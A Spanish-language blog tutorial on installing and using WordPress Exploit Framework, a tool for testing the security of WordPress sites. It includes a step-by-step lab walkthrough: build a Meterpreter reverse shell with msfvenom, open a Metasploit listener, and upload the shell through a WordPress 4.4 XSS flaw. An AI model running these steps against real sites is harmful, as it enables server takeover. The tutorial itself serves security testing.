+++
date = "2018-01-05"
title = "WordPress Exploit FrameWork (WPXF) - Instalación, comandos y uso con ejemplo de explotación"
author = "Javier Olmedo"
toc = false
+++

[![/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_banner.png](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_banner.png)](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_banner.png)

WordPress Exploit FrameWork es una herramienta que sirve de ayuda a los auditores de aplicaciones web a la hora realizar **pruebas de seguridad sobre sitios webs basados en el conocido gestor de contenidos (CMS) WordPress**, está desarrollado en Ruby y está orientado al uso y desarrollo de módulos, exploits y payloads, algo similar al conocido Metasploit.

[![/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_001.png](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_001.png)](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_001.png)

## Pasos a seguir para su instalación

Antes de proceder con la instalación, debemos de **asegurarnos que tenemos Ruby 2.2.x** instalado en el sistema, en mi caso, voy a realizar el tutorial sobre Kali Linux, que ya lo trae por defecto instalado, pero en caso que no lo tuvieramos, podríamos instalarlo con el comando:

```bash
apt-get install ruby-full
```

Os dejo **más información** sobre su instalación en diferentes sistemas operativos.

https://www.ruby-lang.org/es/documentation/installation/

Una vez comprobado, nos situamos en la carpeta `/usr/share/` (la cuál contiene algunas de las herramientas instaladas en Kali Linux) y **descargamos el proyecto** desde GitHub.

```bash
cd /usr/share && git clone https://github.com/shakenetwork/wordpress-exploit-framework.git
```

**Nos situamos dentro de la carpeta de WordPress Exploit FrameWork** e instalamos las dependencias con el comando `bundle install`:

```bash
cd /usr/share/wordpress-exploit-framework/ && bundle install
```

En caso de **no tener bundler en el sistema**, podemos instalarlo ejecutando:

```bash
gem install bundler
```

Para evitarnos posibles problemas de instalación (por ejemplo instalación de dependencias como Nokogiri), nos aseguramos de tener las **herramientas necesarias para compilar**

```bash
apt-get install build-essential patch
```

Además, tambien nos aseguraremos de tener los **archivos de desarrollo**

```bash
apt-get install ruby-dev zlib1g-dev liblzma-dev
```

Hasta aquí, tenemos todo preparado para empezar a usarlo.

## ¿Cómo usar WordPress Exploit FrameWork?

Para ejecutarlo, nos situamos sobre la **carpeta del proyecto y lo lanzamos con ruby** de la siguiente manera:

```bash
cd /usr/share/wordpress-exploit-framework/ && ruby wpxf.rb
```

Podemos **ver los comandos disponibles** con `help`:

[![/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_002.png](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_002.png)](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_002.png)

## Comandos disponibles

- **back**: Regresa a la opción inmediatamente anterior.
- **check**: Realiza la comprobación de que el modulo cargado actualmente puede ser usado en el target - establecido.
- **clear**: Limpia la pantalla.
- **exit**: Finaliza wpxf.
- **gset [opcion] [valor]**: Asigna un valor a una variable globalmente la cual es usada para los módulos - actuales y futuros con el mismo valor.
- **gunset [opcion]**: Reasignal un valor a una variable que fue modificada con gset.
- **help**: Muestra la ayuda.
- **info**: Muestra información del modulo actual.
- **quit**: Sale de WordPress Exploit FrameWork.
- **run**: Ejecuta el módulo cargado actualmente.
- **set [opcion] [valor]**: Modifica el valor de una variable para la sesión actual.
- **search [texto]**: Realiza una búsqueda dentro de los módulos de las palabras dadas (Muy útil para - búsquedas específicas de exploits).
- **show advanced**: Muestra opciones avanzadas de configuración del módulo actual.
- **show auxiliary**: Muestra los módulos auxiliares disponibles.
- **show exploits**: Muestra los exploits disponibles.
- **show options**: Muestra las opciones de configuración necesarias para ejecutar un módulo (host, path, - puerto, etc).
- **unset [opcion]**: Reasigna un valor a una variable modificada con set.
- **use [modulo/exploit]**: Usa el módulo especificado si está disponible en la ruta especificada.

## Payloads disponibles

- **bind_php**: Carga un script que se vinculará a un puerto específico y permitirá a WordPress Exploit FrameWork establecer un shell remoto.
- **custom**: Carga y ejecuta un script PHP personalizado.
- **download_exec**: Descarga y ejecuta un archivo ejecutable remoto.
- **meterpreter_bind_tcp**: Carga útil de Meterpreter bind TCP generada utilizando msfvenom.
- **meterpreter_reverse_tcp**: Carga útil TCP inversa de Meterpreter generada mediante msfvenom.
- **exec**: Ejecuta un comando de shell en el servidor remoto y devuelve el resultado a la sesión de WordPress - Exploit FrameWork.
- **reverse_tcp**: Carga una secuencia de comandos que establecerá un shell TCP inverso.

## Ejemplo sobre como subir una shell

Este ejemplo **se ha probado sobre máquinas virtuales dentro de una misma red LAN**, el proceso sería exactamente el mismo para ataques fuera de la red pero tendríamos que hacer **portforwarding** (redirección de puertos) o hacer uso de algún servicio como [Ngrok]().

Se ha utilizado la **versión 4.4 de WordPress** como sitio web vulnerable , puedes descargar esta versión desde su repositorio.

https://es.wordpress.org/releases/

Como atacante se ha utilizado una máquina virtual con **Kali Linux y el exploit wp_v4.4_xss_shell_upload** (WordPress 4.4 Reflected XSS Shell Upload).

## Paso 1: Crear una shell con msfvenom

En este paso, **crearemos una shell** para posteriormente aprovechar una vulnerabilidad y subirla al servidor

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP-ATACANTE] LPORT=[PUERTO-ATACANTE] -o mishell.php
```

[![/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_003.png](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_003.png)](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_003.png)

## Paso 2: Poner a la escucha Metasploit

Aquí **dejaremos a la escucha la máquina atacante** para obtener la shell cuando se explote la vulnerabilidad.

El proceso que seguiremos será el siguiente, **abrimos metasploit, seleccionamos el exploit** y **configuramos el payload con IP y puerto del atacante**, finalmente lo dejamos a la escucha, procederíamos de la siguiente manera:

```bash
msfconsole
```

```bash
use exploit/multi/handler
```

```bash
set payload php/meterpreter/reverse_tcp
```

```bash
set lhost [IP-ATACANTE]
```

```bash
set lport [PUERTO-ATACANTE]
```

```bash
exploit
```

Así nos quedaría Metasploit a la escucha:

[![/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_004.png](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_004.png)](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_004.png)

## Paso 3: Lanzar el exploit con WordPress Exploit FrameWork

El **paso más importante**, aprovecharemos la vulnerabilidad de la **versión 4.4 de WordPress para subir una shell** (Paso 1) y que **conecte con la máquina atacante** que permanece a la escucha (Paso 2), en este punto se da como explotada y aprovechada la vulnerabilidad.

```bash
use exploit/wp_v4.4_xss_shell_upload
```

```bash
set payload custom
```

```bash
set host [IP-VICTIMA]
```

```bash
set target_uri [RUTA-RAIZ-WORDPRESS]
```

```bash
set payload_path [RUTA-SHELL]
```

```bash
run
```

Si todo ha ido bien, quedará confirmada la vulnerabilidad y veremos algo como esto en la ventana de Metasploit:

[![/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_005.png](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_005.png)](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_005.png)

[![/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_006.png](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_006.png)](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_006.png)

## ¿Cómo puedo crear mis propios módulos?

La guía sobre como crear tus propios módulos y cargas la puedes encontrar en la Wiki del proyecto, tambien puede ver la documentación completa de la API.

[![/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_007.png](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_007.png)](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_007.png)

https://github.com/rastating/wordpress-exploit-framework/wiki

[![/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_008.png](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_008.png)](/images/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion/wpxf-instalacion-comandos-y-uso-con-ejemplo-de-explotacion_008.png)

http://www.getwpxf.com/

Hasta aquí la entrada,

Un saludo a todos!!